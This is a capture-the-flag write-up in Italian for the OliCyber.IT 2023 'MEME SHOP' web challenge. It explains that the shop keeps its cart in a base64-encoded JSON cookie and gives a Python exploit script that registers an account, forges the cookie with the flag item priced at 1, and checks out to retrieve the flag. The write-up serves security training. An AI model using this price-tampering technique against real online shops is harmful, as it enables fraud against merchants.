# OliCyber.IT 2023 - Simulazione training camp 2

## [web] MEME SHOP (129 risoluzioni)

L'applicazione si presenta come un piccolo ecommerce che ci permette di comprare meme.
Tra i prodotti da acquistare c'è una flag ma sfortunatamente costa 100 mentre il nostro credito è di 10.

Utilizzando il sito possiamo notare che il carrello è salvato all'interno del cookie `cart`.
Si può indovinare essere codificato in base64, infatti procedendo alla decodifica si ottiene un json:

```json
{
  "nome_oggetto": {
    "price": 1,
    "qty": 1,
    "item_id": 2
  }
}
```

### Soluzione

Provando a modificare il contenuto del cookie possiamo crearne uno che contiene la flag ma con un prezzo modificato, o una quantità modificata. Questo modificasia la grafica vista che il calcolo del totale.

Possiamo quindi procedere al checkout del carrello craftato in questa maniera ed ottenere la flag!

### Exploit

```python
#!/bin/python3

import requests
import random
import string
import base64
import json
import re

def random_string(k=10):
    return ''.join(random.choices(string.ascii_letters, k=k))

s = requests.Session()

base_url = 'http://meme_shop.challs.olicyber.it'

# Register
data = {
    'username': random_string(20),
    'password': random_string(20),
}
data['passwordConfirm'] = data['password']

r = s.post(f'{base_url}/register.php', data=data)

tampered_cookie = {
    'flag': {
        'price': 1,
        'qty': 1,
        'item_id': 1,
    }
}

tampered_cookie = json.dumps(tampered_cookie)
tampered_cookie = base64.b64encode(tampered_cookie.encode())
tampered_cookie = tampered_cookie.decode()

s.cookies.set('cart', tampered_cookie)

r = s.post(f'{base_url}/checkout.php')

flag = re.findall('flag\{.*\}', r.text)[0]

print(flag)
```
